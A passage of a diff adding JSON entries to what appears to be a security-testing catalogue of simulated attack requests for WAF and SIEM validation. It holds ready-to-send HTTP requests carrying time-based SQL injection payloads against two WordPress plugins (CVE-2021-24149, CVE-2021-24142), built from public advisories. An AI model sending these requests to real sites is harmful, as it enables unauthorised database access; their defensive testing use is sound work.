+        "link": "https://wpscan.com/vulnerability/5ee77dd7-5a73-4d4e-8038-23e6e763e20c/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24149 - Modern Events Calendar Lite WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24149 - Modern Events Calendar Lite WordPress Plugin SQL Injection",
+    "description": "Modern Events Calendar Lite before 5.16.6 does not sanitise the mec[post_id] POST parameter in the mec_fes_form AJAX action (author+), leading to authenticated SQL injection. The request sends a time-based (AND SLEEP(5)) payload in mec[post_id] to /wp-admin/admin-ajax.php. No vendor WAF rule found; built from the WPScan advisory.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/26819680-22a8-4348-b63d-dc52c0d50ed0 (WPScan advisory)\n- https://www.cve.org/CVERecord?id=CVE-2021-24149 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=mec_fes_form&mec%5Bpost_id%5D=1%20AND%20SLEEP(5)\n"
+    },
+    "cves": [
+      "CVE-2021-24149"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24149",
+        "link": "https://wpscan.com/vulnerability/26819680-22a8-4348-b63d-dc52c0d50ed0"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24142 - 301 Redirects Easy Redirect Manager WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24142 - 301 Redirects Easy Redirect Manager WordPress Plugin SQL Injection",
+    "description": "301 Redirects - Easy Redirect Manager before 2.51 does not sanitise the 'Redirect From' column when importing a CSV file, allowing high-privilege users to perform SQL injection. The request uploads a CSV (eps_redirect_upload_file) whose second column carries a time-based SQLi payload (' or sleep(5)#) to the import-export settings page. No vendor WAF rule found; built from the WPScan advisory PoC. Note: ModSecurity/CRS inspects the multipart body, so it matches the SQLi pattern in the CSV field.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/19800898-d7b6-4edd-887b-dac3c0597f14 (WPScan advisory, PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24142 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/options-general.php?page=eps_redirects&tab=import-export HTTP/1.1\nHost: {{target_host}}\nContent-Type: multipart/form-data; boundary=----cym\nCookie: wordpress_logged_in=dummy\n\n------cym\nContent-Disposition: form-data; name=\"eps_redirect_nonce_submit\"\n\ndummy\n------cym\nContent-Disposition: form-data; name=\"eps_redirect_upload_method\"\n\nskip\n------cym\nContent-Disposition: form-data; name=\"eps_redirect_upload_file\"; filename=\"redirects.csv\"\nContent-Type: text/csv\n\n301,' or sleep(5)#,/yolo,0\n------cym\nContent-Disposition: form-data; name=\"eps_redirect_upload\"\n\nUpload CSV\n------cym--\n"
+    },
+    "cves": [
+      "CVE-2021-24142"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24142",
+        "link": "https://wpscan.com/vulnerability/19800898-d7b6-4edd-887b-dac3c0597f14"
       }
     ],
     "public": false,
